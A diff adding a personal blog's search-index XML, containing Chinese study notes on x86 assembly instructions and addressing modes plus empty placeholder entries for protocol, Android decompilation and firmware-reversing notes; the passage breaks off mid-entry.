@@ -1,0 +1,982 @@
+<xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>汇编指令集</title>
+      <link href="2020/12/31/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E9%9B%86/"/>
+      <url>2020/12/31/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E9%9B%86/</url>
+      
+        <content type="html"><![CDATA[<h2 id="数据传输指令"><a href="#数据传输指令" class="headerlink" title="数据传输指令"></a>数据传输指令</h2><p>数据传输类指令主要包括数据传送、数据交换、堆栈操作、查表转换、地址传送、标志位传送、I/O数据传送指令。这类指令的主要特点是大部分指令操作完成后，对FR中的标志位不产生影响。它们在<a href="https://baike.baidu.com/item/%E5%AD%98%E5%82%A8%E5%99%A8">存储器</a>和<a href="https://baike.baidu.com/item/%E5%AF%84%E5%AD%98%E5%99%A8">寄存器</a>、寄存器和输入输出端口之间传送数据。 [4] </p><h3 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h3><p>MOV：传送字或字节。</p><p>MOVSX：先符号扩展，再传送。</p><p><a href="https://baike.baidu.com/item/MOVZX">MOVZX</a>：先零扩展，再传送。</p><p>PUSH：把字压入<a href="https://baike.baidu.com/item/%E5%A0%86%E6%A0%88">堆栈</a>。</p><p>POP： 把字弹出<a href="https://baike.baidu.com/item/%E5%A0%86%E6%A0%88/1682032">堆栈</a>。</p><p>PUSHA： 把AX，CX，DX，BX，SP，BP，SI，DI依次压入<a href="https://baike.baidu.com/item/%E5%A0%86%E6%A0%88">堆栈</a>。</p><p>POPA： 把DI，SI，BP，SP，BX，DX，CX，AX依次弹出<a href="https://baike.baidu.com/item/%E5%A0%86%E6%A0%88">堆栈</a>。</p><p><a href="https://baike.baidu.com/item/PUSHAD">PUSHAD</a>： 把EAX，ECX，EDX，EBX，ESP，EBP，ESI，EDI依次压入<a href="https://baike.baidu.com/item/%E5%A0%86%E6%A0%88">堆栈</a>。</p><p>POPAD： 把EDI，ESI，EBP，ESP，EBX，EDX，ECX，EAX依次弹出<a href="https://baike.baidu.com/item/%E5%A0%86%E6%A0%88">堆栈</a>。</p><p>BSWAP： 交换32位寄存器里字节的顺序。</p><p>XCHG： 交换字或字节。( 至少有一个<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E6%95%B0">操作数</a>为寄存器,<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A8">段寄存器</a>不可作为操作数)</p><p>CMPXCHG： 比较并交换<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E6%95%B0">操作数</a>。（第二个操作数必须为<a href="https://baike.baidu.com/item/%E7%B4%AF%E5%8A%A0%E5%99%A8">累加器</a>AL/AX/EAX）</p><p>XADD： 先交换再累加。( 结果在第一个<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E6%95%B0">操作数</a>里 )</p><p>XLAT： 字节查表转换── BX 指向一张 256 字节的表的起点，AL 为表的索引值（0-255，即0-FFH）； 返回 AL 为查表结果 （ [BX+AL]-&gt;AL） [6] </p><h3 id="输入输出端口传送指令"><a href="#输入输出端口传送指令" class="headerlink" title="输入输出端口传送指令"></a>输入输出端口传送指令</h3><p>IN： I/O端口输入。（ 语法：IN <a href="https://baike.baidu.com/item/%E7%B4%AF%E5%8A%A0%E5%99%A8">累加器</a>，{<a href="https://baike.baidu.com/item/%E7%AB%AF%E5%8F%A3%E5%8F%B7">端口号</a>│DX} ）</p><p>OUT： I/O端口输出. （语法：OUT {端口号│DX}，<a href="https://baike.baidu.com/item/%E7%B4%AF%E5%8A%A0%E5%99%A8">累加器</a>）输入输出端口由立即方式指定时，其范围是 0-255；由寄存器DX 指定时，其范围是 0-65535。 [6] </p><h3 id="目的地址传送指令"><a href="#目的地址传送指令" class="headerlink" title="目的地址传送指令"></a>目的地址传送指令</h3><p>LEA： 装入<a href="https://baike.baidu.com/item/%E6%9C%89%E6%95%88%E5%9C%B0%E5%9D%80">有效地址</a>。例：LEA DX，string；把<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">偏移地址</a>存到DX。</p><p>LDS： 传送目标<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88">指针</a>，把指针内容装入DS。例： LDS SI，string；把<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%9C%B0%E5%9D%80">段地址</a>：<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">偏移地址</a>存到DS：SI。</p><p>LES： 传送目标<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88">指针</a>，把指针内容装入ES。例： LES DI，string；把<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%9C%B0%E5%9D%80">段地址</a>：<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">偏移地址</a>存到ES：DI。</p><p>LFS： 传送目标<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88">指针</a>，把指针内容装入FS。例： LFS DI，string；把<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%9C%B0%E5%9D%80">段地址</a>：<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">偏移地址</a>存到FS：DI。</p><p>LGS： 传送目标<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88">指针</a>，把指针内容装入GS。例： LGS DI，string；把<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%9C%B0%E5%9D%80">段地址</a>：<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">偏移地址</a>存到GS：DI。</p><p>LSS： 传送目标<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88">指针</a>，把指针内容装入SS。例： LSS DI，string；把<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%9C%B0%E5%9D%80">段地址</a>：<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">偏移地址</a>存到SS：DI。 [6] </p><h3 id="标志传送指令"><a href="#标志传送指令" class="headerlink" title="标志传送指令"></a>标志传送指令</h3><p><a href="https://baike.baidu.com/item/LAHF">LAHF</a>：<a href="https://baike.baidu.com/item/%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8">标志寄存器</a>传送，把标志装入AH。</p><p>SAHF： <a href="https://baike.baidu.com/item/%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8">标志寄存器</a>传送，把AH内容装入标志寄存器。</p><p>PUSHF： 标志<a href="https://baike.baidu.com/item/%E5%85%A5%E6%A0%88/12688157">入栈</a>。</p><p>POPF： 标志<a href="https://baike.baidu.com/item/%E5%87%BA%E6%A0%88">出栈</a>。</p><p>PUSHD： 32位标志<a href="https://baike.baidu.com/item/%E5%85%A5%E6%A0%88/12688157">入栈</a>。</p><p>POPD： 32位标志<a href="https://baike.baidu.com/item/%E5%87%BA%E6%A0%88">出栈</a>。 [6] </p><h2 id="算术运算指令"><a href="#算术运算指令" class="headerlink" title="算术运算指令"></a>算术运算指令</h2><p>算数运算类指令包括加减乘除、比较与调整指令。它们可进行8位、16位和32位的运算。参加运算的操作数可以说二进制数和十进制数（BCD码），这些数可以是无符号数，也可以是带符号数。算术运算指令的主要特点是执行结果影响标志寄存器的状态标志位OF、SF、ZF、AF、PF、CF。 [4] </p><p>ADD： 加法。</p><p>ADC： 带进位加法。</p><p>INC： 加 1。</p><p>AAA： 加法的<a href="https://baike.baidu.com/item/ASCII%E7%A0%81/4607931">ASCII码</a>调整。</p><p>DAA： 加法的十进制调整。</p><p>SUB： 减法。</p><p>SBB： 带借位减法。</p><p>DEC： 减 1。</p><p>NEG： 取补。</p><p>CMP： 比较。（两<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E6%95%B0">操作数</a>作减法，仅修改标志位，不回送结果）</p><p>AAS： 减法的<a href="https://baike.baidu.com/item/ASCII%E7%A0%81/4607931">ASCII码</a>调整。</p><p>DAS： 减法的十进制调整。</p><p>MUL： 无符号乘法。结果回送AH和AL（字节运算），或DX和AX（字运算）</p><p>IMUL： 整数乘法。结果回送AH和AL（字节运算），或DX和AX（字运算）</p><p>AAM： 乘法的ASCII码调整。</p><p>DIV： 无符号除法：商回送AL，余数回送AH，（字节运算）；或商回送AX，余数回送DX（字运算）</p><p>IDIV： 整数除法：商回送AL，余数回送AH，（字节运算）；或商回送AX，余数回送DX（字运算）</p><p>AAD： 除法的<a href="https://baike.baidu.com/item/ASCII%E7%A0%81/4607931">ASCII码</a>调整。</p><p>CBW： 字节转换为字。（把AL中字节的符号扩展到AH中去）</p><p>CWD： 字转换为双字。（把AX中的字的符号扩展到DX中去）</p><p>CWDE： 字转换为双字。 （把AX中的字符号扩展到EAX中去）</p><p>CDQ： 双<a href="https://baike.baidu.com/item/%E5%AD%97%E6%89%A9%E5%B1%95">字扩展</a>。（把EAX中的字的符号扩展到EDX中去） [6] </p><h2 id="逻辑运算类指令"><a href="#逻辑运算类指令" class="headerlink" title="逻辑运算类指令"></a>逻辑运算类指令</h2><p>逻辑运算类指令分为逻辑运算指令和移位指令两大类。 [4] </p><h3 id="逻辑运算指令"><a href="#逻辑运算指令" class="headerlink" title="逻辑运算指令"></a>逻辑运算指令</h3><p>AND： 与运算。</p><p>or： 或运算。</p><p>XOR： 异或运算。</p><p>NOT： 取反。</p><p>TEST： 测试。（两<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E6%95%B0">操作数</a>作与运算，仅修改标志位，不回送结果） [6] </p><h3 id="移位指令"><a href="#移位指令" class="headerlink" title="移位指令"></a>移位指令</h3><p>SHL： 逻辑左移。</p><p>SAL： 算术左移。(=SHL)</p><p>SHR： 逻辑右移。（每位右移，低位进 CF，高位补 0）</p><p>SAR： 算术右移。（每位右移， 低位进 CF，高位不变）</p><p>ROL： 循环左移。</p><p>ROR： 循环右移。</p><p>RCL： 通过进位的循环左移。</p><p>RCR： 通过进位的循环右移。</p><p>以上八种移位指令，其移位次数可达255次。</p><p>移位一次时，可直接用<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E7%A0%81">操作码</a>，如：SHL AX，1；移位&gt;1次时，则由寄存器CL给出移位次数，如：MOV CL，04；SHL AX，CL。 [6] </p><h2 id="串操作指令"><a href="#串操作指令" class="headerlink" title="串操作指令"></a>串操作指令</h2><p>串操作指令用于处理存放在存储器中的数据串，有串传送、串比较、串扫描、串装入、串存储。其中，仅有串比较和串扫描指令对标志位OF、SF、ZF、AF、PF、CF有影响。 [4] </p><p>DS：SI ——源串<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A8">段寄存器</a>：源串<a href="https://baike.baidu.com/item/%E5%8F%98%E5%9D%80">变址</a>。</p><p>ES：DI ——目标串<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A8">段寄存器</a>：目标串<a href="https://baike.baidu.com/item/%E5%8F%98%E5%9D%80">变址</a>。</p><p>CX： 重复次数计数器。</p><p>AL/AX： 扫描值。</p><p>D标志： 0表示重复操作中SI和DI应自动增量；1表示应自动减量。</p><p>Z标志： 用来控制扫描或比较操作的结束。</p><p>MOVS： 串传送。（MOVSB 传送字符， MOVSW 传送字， MOVSD 传送双字）</p><p>CMPS： 串比较。（CMPSB 比较字符， CMPSW 比较字）</p><p>SCAS： 串扫描。把AL或AX的内容与目标串作比较，比较结果反映在标志位。</p><p>LODS： 装入串。把源串中的元素（字或字节）逐一装入AL或AX中。（<a href="https://baike.baidu.com/item/LODSB">LODSB</a> 传送字符， LODSW 传送字，LODSD 传送双字）</p><p>STOS： 保存串。是LODS的逆过程。</p><p>REP： 当CX/ECX&lt;&gt;0时重复。</p><p>REPE/REPZ： 当ZF=1或比较结果相等，且CX/ECX&lt;&gt;0时重复。</p><p>REPNE/REPNZ： 当ZF=0或比较结果不相等，且CX/ECX&lt;&gt;0时重复。</p><p>REPC： 当CF=1且CX/ECX&lt;&gt;0时重复。</p><p>REPNC： 当CF=0且CX/ECX&lt;&gt;0时重复。 [6] </p><h2 id="程序转移指令"><a href="#程序转移指令" class="headerlink" title="程序转移指令"></a>程序转移指令</h2><p>控制转移类指令包括无条件转移指令、条件转移指令、循环控制指令、中断指令、子程序调用和返回指令。 [4] </p><h3 id="无条件转移指令"><a href="#无条件转移指令" class="headerlink" title="无条件转移指令"></a>无条件转移指令</h3><p>（长转移）</p><p>JMP： 无条件转移指令。</p><p>CALL： 过程调用。</p><p>RET/RETF： 过程返回。 [6] </p><h3 id="条件转移指令"><a href="#条件转移指令" class="headerlink" title="条件转移指令"></a>条件转移指令</h3><p>（短转移，-128到+127的距离内；当且仅当(SF、XOR、OF)=1时，OP1&lt;OP2 ）</p><p>JA/JNBE： 大于转移。</p><p>JAE/JNB： 大于或等于转移。</p><p>JB/JNAE： 小于转移。</p><p>JBE/<a href="https://baike.baidu.com/item/JNA">JNA</a>： 小于或等于转移。</p><p>以上四条，测试<a href="https://baike.baidu.com/item/%E6%97%A0%E7%AC%A6%E5%8F%B7%E6%95%B4%E6%95%B0">无符号整数</a>运算的结果（标志C和Z）</p><p>JG/JNLE： 大于转移。</p><p>JGE/JNL： 大于或等于转移。</p><p>JL/JNGE： 小于转移。</p><p><a href="https://baike.baidu.com/item/JLE">JLE</a>/JNG： 小于或等于转移。</p><p>以上四条，测试带符号整数运算的结果（标志S，O和Z）</p><p>JE/JZ： 等于转移。</p><p>JNE/JNZ： 不等于时转移。</p><p>JC： 有进位时转移。</p><p>JNC： 无进位时转移。</p><p>JNO： 不溢出时转移。</p><p>JNP/JPO： 奇偶性为奇数时转移。</p><p>JNS： 符号位为 “0” 时转移。</p><p>JO： 溢出转移。</p><p>JP/JPE： 奇偶性为偶数时转移。</p><p>JS： 符号位为 “1” 时转移。 [6] </p><h3 id="循环控制指令"><a href="#循环控制指令" class="headerlink" title="循环控制指令"></a>循环控制指令</h3><p>（短转移）</p><p>LOOP： CX不为零时循环。</p><p>LOOPE/LOOPZ： CX不为零且标志Z=1时循环。</p><p>LOOPNE/LOOPNZ： CX不为零且标志Z=0时循环。</p><p>JCXZ： CX为零时转移。</p><p>JECXZ： ECX为零时转移。 [6] </p><h3 id="中断指令"><a href="#中断指令" class="headerlink" title="中断指令"></a>中断指令</h3><p>INT： <a href="https://baike.baidu.com/item/%E4%B8%AD%E6%96%AD%E6%8C%87%E4%BB%A4">中断指令</a>。</p><p>INTO： 溢出中断。</p><p>IRET： 中断返回。 [6] </p><h2 id="其他指令"><a href="#其他指令" class="headerlink" title="其他指令"></a>其他指令</h2><h3 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h3><p>DB： 定义字节（1字节）</p><p>DW： 定义字（2字节）</p><p>DD： 定义双字（4字节）</p><p>PROC： 定义过程。</p><p>ENDP： 过程结束。</p><p>SEGMENT： 定义段。</p><p>ASSUME： 建立段<a href="https://baike.baidu.com/item/%E5%AF%84%E5%AD%98%E5%99%A8%E5%AF%BB%E5%9D%80">寄存器寻址</a>。</p><p>ENDS： 段结束。</p><p>END： 程序结束。 [6] </p><h3 id="处理机控制指令"><a href="#处理机控制指令" class="headerlink" title="处理机控制指令"></a>处理机控制指令</h3><p>即标志处理指令，处理机控制指令完成简单的控制功能。</p><p>CLC： （进位位置0指令）</p><p>CMC： （进位位求反指令）</p><p>CLC： （进位位置为0指令）</p><p>STC： （进位位置为1指令）</p><p>CLD： （方向标志位置0指令）</p><p>STD： （方向标志位置1指令）</p><p>CLI： （中断标志置0指令）</p><p>STI： （中断标志置1指令）</p><p>NOP： （无操作）</p><p>HLT： （停机）</p><p>WAIT： （等待）</p><p>ESC： （换码）</p><p>LOCK： （封锁） [6]</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> x86汇编 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> x86汇编 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>AMQP协议笔记(0X01)</title>
+      <link href="2020/10/01/AMQP%E5%8D%8F%E8%AE%AE0_1/"/>
+      <url>2020/10/01/AMQP%E5%8D%8F%E8%AE%AE0_1/</url>
+      
+        <content type="html"><![CDATA[<p>*<u>PS:本文仅是学习笔记，将自己认为重要的点记录下来；</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络通信协议 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> AMQP协议 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ARM汇编学习笔记(0X01)</title>
+      <link href="2020/10/01/ARM%E6%B1%87%E7%BC%9601/"/>
+      <url>2020/10/01/ARM%E6%B1%87%E7%BC%9601/</url>
+      
+        <content type="html"><![CDATA[<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；</em></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ARM汇编 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ARM汇编 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Android反编译学习笔记(0X01)</title>
+      <link href="2020/10/01/Andoird%E5%8F%8D%E7%BC%96%E8%AF%9101/"/>
+      <url>2020/10/01/Andoird%E5%8F%8D%E7%BC%96%E8%AF%9101/</url>
+      
+        <content type="html"><![CDATA[<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；</em></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Android反编译 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Android反编译 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>BLE协议笔记(0X01)</title>
+      <link href="2020/10/01/BLE%E5%8D%8F%E8%AE%AE01/"/>
+      <url>2020/10/01/BLE%E5%8D%8F%E8%AE%AE01/</url>
+      
+        <content type="html"><![CDATA[<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；</em></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络通信协议 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> BLE协议 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CoAP协议笔记(0X01)</title>
+      <link href="2020/10/01/CoAP%E5%8D%8F%E8%AE%AE01/"/>
+      <url>2020/10/01/CoAP%E5%8D%8F%E8%AE%AE01/</url>
+      
+        <content type="html"><![CDATA[<p>暂空，将之后要学习的内容列出来</p><p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；</em></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络通信协议 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CoAP协议 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>JT808协议笔记(0X01)</title>
+      <link href="2020/10/01/JT808%E5%8D%8F%E8%AE%AE01/"/>
+      <url>2020/10/01/JT808%E5%8D%8F%E8%AE%AE01/</url>
+      
+        <content type="html"><![CDATA[<p>暂空，将之后要学习的内容列出来</p><p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；</em></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络通信协议 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> JT808协议 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MQTT协议笔记(0X01)</title>
+      <link href="2020/10/01/MQTT%E5%8D%8F%E8%AE%AE01/"/>
+      <url>2020/10/01/MQTT%E5%8D%8F%E8%AE%AE01/</url>
+      
+        <content type="html"><![CDATA[<p>暂空，将之后要学习的内容列出来</p><p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；</em></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络通信协议 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> MQTT协议 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>NFC协议笔记(0X01)</title>
+      <link href="2020/10/01/NFC%E5%8D%8F%E8%AE%AE01/"/>
+      <url>2020/10/01/NFC%E5%8D%8F%E8%AE%AE01/</url>
+      
+        <content type="html"><![CDATA[<p>暂空，将之后要学习的内容列出来</p><p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；</em></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络通信协议 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> NFC协议 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>RF协议笔记(0X01)</title>
+      <link href="2020/10/01/RF%E5%8D%8F%E8%AE%AE01/"/>
+      <url>2020/10/01/RF%E5%8D%8F%E8%AE%AE01/</url>
+      
+        <content type="html"><![CDATA[<p>暂空，将之后要学习的内容列出来</p><p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；</em></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络通信协议 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> RF协议 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Wi-Fi协议笔记(0X01)</title>
+      <link href="2020/10/01/Wi-Fi%E5%8D%8F%E8%AE%AE01/"/>
+      <url>2020/10/01/Wi-Fi%E5%8D%8F%E8%AE%AE01/</url>
+      
+        <content type="html"><![CDATA[<p>暂空，将之后要学习的内容列出来</p><p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；</em></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络通信协议 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Wi-Fi协议 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ZigBee协议笔记(0X01)</title>
+      <link href="2020/10/01/ZigBee%E5%8D%8F%E8%AE%AE01/"/>
+      <url>2020/10/01/ZigBee%E5%8D%8F%E8%AE%AE01/</url>
+      
+        <content type="html"><![CDATA[<p>暂空，将之后要学习的内容列出来</p><p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；</em></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络通信协议 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ZigBee协议 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>固件逆向学习笔记(0X01)</title>
+      <link href="2020/10/01/%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%9101/"/>
+      <url>2020/10/01/%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%9101/</url>
+      
+        <content type="html"><![CDATA[<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；</em></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 固件逆向 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 固件逆向 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>硬件电路构成学习笔记(0X01)</title>
+      <link href="2020/10/01/%E7%A1%AC%E4%BB%B6%E7%94%B5%E8%B7%AF%E6%9E%84%E6%88%9001/"/>
+      <url>2020/10/01/%E7%A1%AC%E4%BB%B6%E7%94%B5%E8%B7%AF%E6%9E%84%E6%88%9001/</url>
+      
+        <content type="html"><![CDATA[<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；</em></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 硬件电路构成 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 硬件电路构成 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>x86汇编学习笔记(0X11)</title>
+      <link href="2020/09/26/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x11/"/>
+      <url>2020/09/26/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x11/</url>
+      
+        <content type="html"><![CDATA[<h1 id="定位内存地址的方法"><a href="#定位内存地址的方法" class="headerlink" title="定位内存地址的方法"></a>定位内存地址的方法</h1><h2 id="and和or指令"><a href="#and和or指令" class="headerlink" title="and和or指令"></a>and和or指令</h2><ol><li><p>and指令：逻辑<strong>与</strong>指令，按位进行与运算</p><p> 例：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">moval,01100011B</span><br><span class="line">and al,00111011B</span><br></pre></td></tr></table></figure><p> 执行后：al=00100011B</p></li><li><p>or指令：逻辑<strong>或</strong>指令，按位进行或运算</p><p> 例：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">moval,01100011B</span><br><span class="line">or al,00111011B</span><br></pre></td></tr></table></figure><p> 执行后：al=011d11011B</p></li></ol><h2 id="以字符的形式给出的数据"><a href="#以字符的形式给出的数据" class="headerlink" title="以字符的形式给出的数据"></a>以字符的形式给出的数据</h2><p>在汇编程序中，用‘…’的方式指明数据是以字符的形式给出的，编译器将他们转化为ASCII码。例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,&#39;a&#39;</span><br><span class="line">mov bl,&#39;b&#39;</span><br></pre></td></tr></table></figure><h2 id="大小写转换的问题"><a href="#大小写转换的问题" class="headerlink" title="大小写转换的问题"></a>大小写转换的问题</h2><p>A的ASCII码是41H，a的ASCII码是61H，将41H加20就得到了a的ASCII值。要改变一个字符的大小写，实际就是改变他的ASCII码。</p><h2 id="SI和DI"><a href="#SI和DI" class="headerlink" title="SI和DI"></a>SI和DI</h2><p>SI和DI是8086CPU中和bx功能相近的寄存器，si和di不能够分成两个8位寄存器来使用。</p><h2 id="bx-si-和-bx-di"><a href="#bx-si-和-bx-di" class="headerlink" title="[bx+si]和[bx+di]"></a>[bx+si]和[bx+di]</h2><p>[bx+si]表示一个内存单元，它的偏移地址为(bx)+(si)     //即bx中的数值加上si中的数值。</p><p>指令mov ax,[bx+si]的含义如下：</p><p>将一个内存单元的内容送入ax寄存器中，这个内存单元的长度为2字节，偏移地址为[bx]中的数值加上[si]中的数值，段地址在ds中。</p><p>该指令也可以写成如下格式（常用）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bx] [si]</span><br></pre></td></tr></table></figure><h2 id="bx-si-idata-和-bx-di-idata"><a href="#bx-si-idata-和-bx-di-idata" class="headerlink" title="[bx+si+idata]和[bx+di+idata]"></a>[bx+si+idata]和[bx+di+idata]</h2><p>[bx+si+idata]表示一个内存单元，它的偏移地址为(bx)+(si)+idata     //即bx中的数值加上si中的数值再加上idata。</p><p>指令mov ax,[bx+si+idata]的含义如下：</p><p>将一个内存单元的内容送入ax寄存器中，这个内存单元的长度为2字节，偏移地址为[bx]中的数值加上[si]中的数值再加上idata，段地址在ds中。</p><p>该指令也可以写成如下格式（常用）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bx] [si].200</span><br><span class="line"></span><br><span class="line">mov ax,[bx+si+200]</span><br><span class="line"></span><br><span class="line">mov ax,200 [bx] [si]</span><br></pre></td></tr></table></figure><h2 id="不同寻址方式的灵活应用"><a href="#不同寻址方式的灵活应用" class="headerlink" title="不同寻址方式的灵活应用"></a>不同寻址方式的灵活应用</h2><ol><li>[idata]用一个常量来表示地址，可用于直接定位一个内存单元</li><li>[bx]用一个变量来表示地址，可用于间接定位一个内存单元</li><li>[bx+idata]用一个变量加一个常量来表示地址，可在一个其实地址的基础上，用变量间接定位一个内存单元</li><li>[bx+si]用两个变量表示地址</li><li>[bx+si+idata]和[bx+di+idata]用两个变量加一个常量表示地址</li></ol><p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《汇编语言（第3版）》王爽著；</em></strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> x86汇编 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> x86汇编 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>x86汇编学习笔记(0X10)</title>
+      <link href="2020/09/26/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x10/"/>
+      <url>2020/09/26/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x10/</url>
+      
+        <content type="html"><![CDATA[<h1 id="包含多个段的程序"><a href="#包含多个段的程序" class="headerlink" title="包含多个段的程序"></a>包含多个段的程序</h1><h2 id="在代码段中使用数据"><a href="#在代码段中使用数据" class="headerlink" title="在代码段中使用数据"></a>在代码段中使用数据</h2><blockquote><p>将0123h、0456h、0789h、0abch、0defh、0fedh、0cbah、0987h通过循环的方式累加。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td 